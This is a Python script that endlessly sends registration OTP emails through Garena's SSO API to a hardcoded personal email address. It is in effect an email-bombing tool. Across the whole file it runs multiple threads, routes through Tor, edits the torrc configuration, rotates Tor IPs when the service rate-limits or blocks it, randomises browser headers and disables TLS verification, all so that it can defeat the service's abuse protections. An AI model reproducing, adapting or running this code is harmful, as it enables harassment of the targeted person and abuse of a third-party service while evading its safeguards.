import requests, sys, re, time, random, threading, json, os, subprocess
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings('ignore')

# ============ USER INPUT ============
email = "aashiqsiddiqui278@gmail.com"
threads = 7
use_tor = True
# ====================================

checked = 0
success_count = 0
fail_count = 0
running = True
lock = threading.Lock()
request_lock = threading.Lock()
last_request_time = 0
last_rotate_time = 0
ROTATE_COOLDOWN = 10
tor_process = None

USER_AGENTS = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
]

# ---------- TOR ----------
def start_tor_github_actions():
    global tor_process
    try:
        torrc_add = "\nControlPort 9051\nCookieAuthentication 0\n"
        with open("/etc/tor/torrc", "a") as f:
            f.write(torrc_add)
    except Exception as e:
        print(f"torrc write skipped: {e}")

    try:
        print("Starting tor daemon...")
        tor_process = subprocess.Popen(
            ['tor', '--SocksPort', '9050', '--ControlPort', '9051'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(8)
        print("Tor started")
        return True
    except Exception as e:
        print(f"Tor start error: {e}")
        return False

def rotate_tor_ip(thread_id):
    global last_rotate_time
    with lock:
        now = time.time()
        if now - last_rotate_time < ROTATE_COOLDOWN:
            return False
        last_rotate_time = now

    try:
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print(f"Thread-{thread_id} IP rotated")
        time.sleep(2)
        return True
    except Exception:
        pass

    try:
        import socket
        s = socket.socket()
        s.settimeout(5)
        s.connect(('127.0.0.1', 9051))
        s.send(b'AUTHENTICATE\r\n')
        s.send(b'SIGNAL NEWNYM\r\n')
        s.send(b'QUIT\r\n')
        s.close()
        print(f"Thread-{thread_id} IP rotated (raw)")
        time.sleep(2)
        return True
    except Exception:
        return False

# ---------- SESSION ----------
def get_session():
    s = requests.Session()
    if use_tor:
        s.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
    s.verify = False
    return s

def build_headers():
    return {
        'Host': 'sso.garena.com',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json, text/plain, */*',
        'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="150"',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Sec-Ch-Ua-Mobile': '?0',
        'Origin': 'https://sso.garena.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://sso.garena.com/universal/register?locale=en-SG',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i',
        'Connection': 'close',
    }

# ---------- OTP SENDER ----------
def send_otp(thread_id):
    global checked, success_count, fail_count, last_request_time

    if not running:
        return True

    if use_tor and thread_id % 2 == 0:
        rotate_tor_ip(thread_id)

    session = get_session()
    req_id = str(int(time.time() * 1000))
    encoded_email = quote(email, safe='')

    payload = (
        f"username=AVezkiidddddd"
        f"&email={encoded_email}"
        f"&locale=en-SG"
        f"&format=json"
        f"&id={req_id}"
    )

    try:
        # THIS IS THE CHANGE: Strict 5-second delay before every request
        time.sleep(5)

        r = session.post(
            'https://sso.garena.com/api/send_register_code_email',
            data=payload,
            headers=build_headers(),
            timeout=15
        )

        with lock:
            checked += 1
            print(f"[{checked}] Thread-{thread_id} | Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                if data.get('result') == 0 or data.get('code') == 0:
                    with lock:
                        success_count += 1
                    print(f"[+] OTP sent (Thread-{thread_id})")
                else:
                    with lock:
                        fail_count += 1
                    print(f"    Response: {str(data)[:120]}")
            except Exception:
                with lock:
                    fail_count += 1
        elif r.status_code == 429:
            print("Rate limit (429), rotating...")
            if use_tor:
                rotate_tor_ip(thread_id)
            with lock:
                fail_count += 1
            time.sleep(5)
        elif r.status_code in (403, 401):
            print(f"Blocked ({r.status_code}), rotating...")
            if use_tor:
                rotate_tor_ip(thread_id)
            with lock:
                fail_count += 1
            time.sleep(3)
        else:
            with lock:
                fail_count += 1

        session.close()
        return False

    except Exception as e:
        print(f"Error: {str(e)[:80]}")
        if use_tor:
            rotate_tor_ip(thread_id)
        with lock:
            fail_count += 1
        return False

# ---------- MAIN ----------
if use_tor:
    if not start_tor_github_actions():
        print("Tor failed, continuing without Tor")
        use_tor = False

print(f"\nSending OTPs to {email}")
print(f"Tor: {'Enabled' if use_tor else 'Disabled'}")
print(f"Threads: {threads}")
print("=" * 60)

try:
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while running:
            futures = [executor.submit(send_otp, i) for i in range(threads)]
            for f in futures:
                try:
                    f.result(timeout=30)
                except Exception:
                    pass

            if checked % 10 == 0 and checked > 0:
                print(f"\n[STATS] Sent: {checked} | Success: {success_count} | Failed: {fail_count}\n")

except KeyboardInterrupt:
    print("\n[!] Stopped")
    running = False

finally:
    if tor_process:
        tor_process.terminate()
        print("Tor stopped")

    print("=" * 60)
    print(f"FINAL: Sent={checked} | Success={success_count} | Failed={fail_count}")
